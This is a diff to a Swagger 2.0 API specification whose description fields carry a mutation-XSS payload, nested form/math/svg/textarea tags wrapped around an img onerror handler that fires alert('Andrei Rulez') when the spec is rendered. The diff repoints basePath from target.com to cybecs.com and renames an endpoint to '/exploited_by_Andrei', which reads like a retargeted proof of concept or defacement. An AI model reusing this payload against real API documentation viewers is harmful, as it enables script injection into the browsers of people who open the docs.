@@ -3,10 +3,10 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Andrei Rulez') src=1>"></form>
 
   version: production
-basePath: https://target.com
+basePath: https://cybecs.com
 produces:
 - application/xml
 - application/json
@@ -22,14 +22,14 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - Mathis Pais De Sousa
+      - Cybecs
       operationId: findAccounts
       summary: this is example text
-  "/exploited_by_s1rn3tz":
+  "/exploited_by_Andrei":
     delete:
       parameters:
       - description: |
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Andrei Rulez') src=1>"></form>
 
         format: int64
         in: path
